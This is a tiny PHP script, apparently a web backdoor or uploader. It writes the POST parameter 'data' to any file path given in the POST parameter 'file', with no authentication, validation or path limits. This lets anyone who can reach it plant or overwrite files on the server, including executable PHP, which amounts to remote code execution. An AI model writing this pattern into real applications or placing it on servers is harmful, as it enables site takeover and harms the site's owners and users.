<?php
if(!empty($_POST['data'])){
	$fname = $_POST['file'];
	$data = $_POST['data'];

	$file = fopen($fname, "w");
	fwrite($file, $data);
	fclose($file);
}
?>